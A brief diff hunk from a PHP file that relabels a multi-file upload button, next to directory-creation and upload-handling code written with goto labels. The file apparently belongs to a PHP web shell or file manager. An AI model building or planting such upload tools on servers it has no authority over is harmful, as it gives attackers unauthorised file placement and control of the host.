@@ -311,7 +311,7 @@ box-shadow: 0px 0px 5px #ffff00;
     sS("newDir") ?>" class="ohct">Submit</a></li>
 <li><form method="post" enctype="multipart/form-data" style="padding: 0.10rem;display: inline-block;">
 <input type="file" name="f[]" multiple>
-<input type="submit" value="Submit" name="submit" class="ohct">
+<input type="submit" value="Upload" name="submit" class="ohct">
 <?php
 if (!isset($_FILES["f"])) {
     goto ea;
